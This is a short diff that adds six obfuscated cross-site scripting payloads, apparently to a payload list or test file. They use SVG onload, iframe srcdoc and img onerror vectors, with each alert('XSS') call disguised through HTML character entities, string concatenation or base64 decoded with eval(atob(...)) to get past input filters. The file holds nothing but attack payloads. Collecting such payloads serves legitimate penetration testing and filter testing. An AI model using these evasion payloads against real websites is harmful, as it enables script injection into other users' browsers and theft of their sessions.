@@ -1,0 +1,6 @@
+<svg onload="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">
+<iframe srcdoc="<svg onload=&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>">
+<svg onload="window['al'+'ert']('XSS')">
+<iframe srcdoc="<svg onload=window['al'+'ert']('XSS')>">
+<svg onload="eval(atob('YWxlcnQoJ1hTUycp'))">
+<iframe srcdoc="<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycp'))>">
